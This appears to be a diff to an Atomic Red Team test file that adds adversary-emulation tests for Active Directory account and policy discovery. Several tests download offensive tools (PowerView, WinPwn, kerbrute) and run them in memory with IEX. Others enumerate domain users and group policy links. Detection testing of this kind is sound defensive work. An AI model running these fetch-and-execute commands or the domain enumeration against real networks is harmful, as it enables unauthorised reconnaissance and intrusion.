@@ -35,7 +35,7 @@ atomic_tests:
     computer_name:
       description: Name of remote system to query
       type: String
-      default: $env:COMPUTERNAME
+      default: "%COMPUTERNAME%"
   executor:
     command: |
       query user /SERVER:#{computer_name}
@@ -214,3 +214,98 @@ atomic_tests:
     elevation_required: false
     command: |
       Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
+
+- name: Get-DomainUser with PowerView
+  auto_generated_guid: 93662494-5ed7-4454-a04c-8c8372808ac2
+  description: |
+    Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
+    name: powershell
+- name: Enumerate Active Directory Users with ADSISearcher
+  auto_generated_guid: 02e8be5a-3065-4e54-8cc8-a14d138834d3
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
+- name: Enumerate Linked Policies In ADSISearcher Discovery
+  auto_generated_guid: 7ab0205a-34e4-4a44-9b04-e1541d1a57be
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      (([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+- name: Enumerate Root Domain linked policies Discovery
+  auto_generated_guid: 00c652e2-0750-4ca6-82ff-0204684a6fe4
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      (([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+- name: WinPwn - generaldomaininfo
+  auto_generated_guid: ce483c35-c74b-45a7-a670-631d1e69db3d
+  description: Gathers general domain information using the generaldomaininfo function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      generaldomaininfo -noninteractive -consoleoutput
+    name: powershell
+- name: Kerbrute - userenum
+  auto_generated_guid: f450461c-18d1-4452-9f0d-2c42c3f08624
+  description: Enumerates active directory usernames using the userenum function of Kerbrute
+  supported_platforms:
+  - windows
+  input_arguments:
+    Domain: 
+      description: Domain that is being tested against
+      type: String
+      default: $env:USERDOMAIN
+    DomainController:
+      description: Domain Controller that is being tested against
+      type: String
+      default: $env:UserDnsDomain
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      kerbrute.exe must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\kerbrute.exe){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "$env:TEMP\kerbrute.exe"
+  - description: |
+      username text file must exist in $env:temp.
+    prereq_command: |
+      if (test-path $env:temp\username.txt){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true" -outfile "$env:TEMP\username.txt"
+  executor:
+    command: |-
+      cd $env:temp
+      .\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} $env:TEMP\username.txt
+    name: powershell
